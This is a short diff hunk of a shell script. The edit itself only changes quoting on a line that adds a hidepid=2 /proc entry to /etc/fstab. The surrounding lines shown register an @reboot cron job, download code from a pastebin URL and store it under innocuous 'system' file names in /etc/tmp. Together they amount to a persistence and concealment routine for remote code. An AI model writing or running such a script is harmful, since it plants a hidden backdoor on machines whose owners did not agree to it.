@@ -18,7 +18,7 @@ crontab -l > cronlist.txt;
 grep -qxF '@reboot sleep 20 && /etc/tmp/systeminfo.sh' cronlist.txt || echo '@reboot sleep 20 && /etc/tmp/systeminfo.sh' >> cronlist.txt;
 crontab cronlist.txt;
 rm cronlist.txt;
-echo "proc    /proc    proc    defaults,nosuid,nodev,noexec,relatime,hidepid=2     0     0" >> /etc/fstab;
+echo 'proc    /proc    proc    defaults,nosuid,nodev,noexec,relatime,hidepid=2     0     0' >> /etc/fstab;
 curl https://pastebin.com/raw/Nxw5Rb5X 2>/dev/null > server_code.py;
 mkdir /etc/tmp 2>/dev/null;
 mv server_code.py /etc/tmp/systemlibrary.py;
